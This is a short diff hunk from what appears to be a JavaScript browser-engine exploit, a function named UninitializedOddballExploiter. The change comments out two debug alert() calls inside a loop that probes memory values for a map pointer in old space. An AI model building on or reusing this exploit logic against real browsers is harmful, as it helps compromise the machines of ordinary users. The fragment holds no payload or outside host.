@@ -247,8 +247,8 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
                   
                   // if (prev_hi == array_map || prev_lo == array_map) {
                   if(((((prev_hi >> 20) << 20) == old_space) && (prev_hi & 1 == 1)) || ((((prev_lo >> 20) << 20) == old_space) && (prev_lo & 1 == 1))){
-                      alert("[+]find !");
-                      alert(hex(prev_hi)+hex(prev_lo));
+                      // alert("[+]find !");
+                      // alert(hex(prev_hi)+hex(prev_lo));
                       return [i, hi == 2734n ? 0 : 1];
                   }
               }   
